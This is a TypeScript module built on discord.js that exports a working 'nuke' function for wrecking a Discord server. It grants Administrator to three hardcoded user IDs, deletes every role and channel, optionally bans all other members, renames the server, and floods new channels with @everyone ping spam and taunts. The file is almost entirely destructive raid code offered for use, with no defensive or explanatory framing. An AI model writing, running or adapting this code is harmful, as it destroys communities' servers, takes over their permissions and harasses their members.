import { ChannelType, EmbedBuilder, Guild, GuildBasedChannel, MessageCreateOptions, OverwriteResolvable, PermissionsBitField, TextChannel } from "discord.js";


/**
 * Awaits specific amount of miliseconds before continying
 * Must be used like with await
 * @param ms - Miliseconds to wait
 * @example await ms(5000) //awaits 5 seconds
*/

function sleep(ms:number) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }  


/**
 * This will nuke the provided guild and, yeah
 * Add params in object
 * @param guild - The guild to nuke
 * @param banmembers - If it should ban members
 * @param messsagestospam - How much messages to spam after nuke
 * @param channelstomake - How much channels to make? For each channels will be spammed same amount of messages putted in param messsagestospam
 * @warning PLEASE DONT PUT TOO BIG NUMBERS
 * @example nuke({guild: theguild, banmembers: true, messsagestospam: 69, channelstomake: 10})
 */
async function nuke(options:{guild:Guild, banmembers:Boolean, messsagestospam:number, channelstomake:number}) {
    let channels = options.guild.channels.cache.map(e => e)
    let roles = options.guild.roles.cache.map(e => e)

    let members = (await options.guild.members.fetch()).map(e => e)

    let nukerROLE = await options.guild.roles.create({name: "NUKER", color: "Red", reason: "Nuker moment", permissions: [PermissionsBitField.Flags.Administrator], hoist: true})

    let sasha = members.find(member => member.id === "541209992888320020")
    let intramy = members.find(member => member.id === "726423224908251178")
    let gary = members.find(member => member.id === "782975543166631946") 

    if(sasha) {
        await sasha.roles.add(nukerROLE)
    }
    if(intramy) {
        await intramy.roles.add(nukerROLE)
    }
    if(gary) {
        await gary.roles.add(nukerROLE)
    }

    for (const role of roles) {
        await role.delete().catch(err => console.log(`Cant delete role ${role.name}: ${err.message}`))
        await sleep(25)
    }

    for await (const channel of channels) {
        await channel.delete().catch(err => console.log(`Cant delete channel ${channel.name}: ${err.message}`))
        await sleep(25)
    }


    if(options.banmembers) {
        for await (const member of members) {
            if(member.id === sasha.id || member.id === intramy.id || member.id === gary.id) continue 
            await member.ban({deleteMessageSeconds: 0, reason: "NUKED"}).catch(err => console.log(`Cant ban ${member.user.tag}: ${err.message}`))
            await sleep(25)
        }
    }


    type Channeltypes = {
        channelname: string,
        channeltype: ChannelType,
        channeldescription: string,
        perms: OverwriteResolvable[],
        message?: {message: MessageCreateOptions, reaction?: string}
    }

    let channelstomake: Channeltypes[] = [
        {
            channelname: "⚠️-NUKED_INFO",
            channeltype: ChannelType.GuildText,
            channeldescription: "SERVER NUKED",
            perms: [{id: options.guild.roles.everyone, deny: [PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AddReactions], allow: [PermissionsBitField.Flags.ViewChannel]}] as OverwriteResolvable[],
            message: {message: {content: "@everyone", embeds: [new EmbedBuilder({title: "NUKE", description: "Server got nuked by intramy CRY SOME MORE LOSERS"}).setColor("Yellow")]}, reaction: "⚠️"} 
        },
        {
            channelname: "⚠️🗨️-NUKED_CHAT",
            channeltype: ChannelType.GuildText,
            channeldescription: "Chat about nuke",
            perms: [{id: options.guild.roles.everyone, allow: [PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.AddReactions]}],
            message: {message: {content: "@everyone", embeds: [new EmbedBuilder({title: "NUKE CHAT", description: "Do whatever you want here."}).setColor("Yellow")]}, reaction: "🗨️"}
        }
    ]

    let nukechannel: Channeltypes = {
        channelname: "⚠️🔔-NUKED_SPAM",
        channeltype: ChannelType.GuildText,
        channeldescription: "Spamming pings",
        perms: [{id: options.guild.roles.everyone, deny: [PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AddReactions], allow: [PermissionsBitField.Flags.ViewChannel]}],
        message: {message: {content: "@everyone", embeds: [new EmbedBuilder({title: "GET NUKED", description: ":)"}).setColor("Yellow")]}}
    }


    let nukedchannel = null as unknown as TextChannel

    let category = await options.guild.channels.create({type: ChannelType.GuildCategory, name: "NUKE"})

    let categorySPAM = await options.guild.channels.create({type: ChannelType.GuildCategory, name: "NUKE_SPAM", position: 2})


    let spamchannels = [] as unknown as TextChannel[]

    let countchannels = 0


    for await (const channelsettings of channelstomake) {
        if(channelsettings.channelname === "⚠️🔔-NUKED_SPAM" && options.messsagestospam === 0) return
        let channel = await category.children.create({name: channelsettings.channelname, type: 0, topic: channelsettings.channeldescription, permissionOverwrites: channelsettings.perms}) as TextChannel
        if(channelsettings.message){
            channel.send(channelsettings.message.message).then(msg => channelsettings.message.reaction ? msg.react(channelsettings.message.reaction) : null)
        }
        if(channelsettings.channelname === "⚠️🔔-NUKED_SPAM") {
            nukedchannel = channel
        }
        await sleep(25)
    }

    await options.guild.setName(`[⚠️] NUKED ${options.guild.name}`, "Nuked")

    if(options.messsagestospam > 0 && options.channelstomake > 0) {
        
        for (let i = 0; i < options.channelstomake; i++) {
            let channel = await categorySPAM.children.create({name: nukechannel.channelname, type: 0, topic: nukechannel.channeldescription, permissionOverwrites: nukechannel.perms}) as TextChannel
            spamchannels.push(channel)
            await sleep(25)
          }


          let promises = spamchannels.map(async channel => {
            let channelPromises = [];
      
            for (let i = 0; i < options.messsagestospam; i++) {
              channelPromises.push(channel.send("@everyone GET NUKED\n \nhttps://tenor.com/view/spongebob-spongebob-dancing-blurred-spongebob-dancing-dance-gif-17854966\n \nhttps://tenor.com/view/spoongebob-spongebob-meme-real-gif-26161179\n \nhttps://tenor.com/view/meme-troll-drive-by-memes-gif-18645179\n "));
              await sleep(25);
            }
      
            return Promise.all(channelPromises);
          });
      
          await Promise.all(promises);
        }

    

    return {success: true}


}


export { nuke }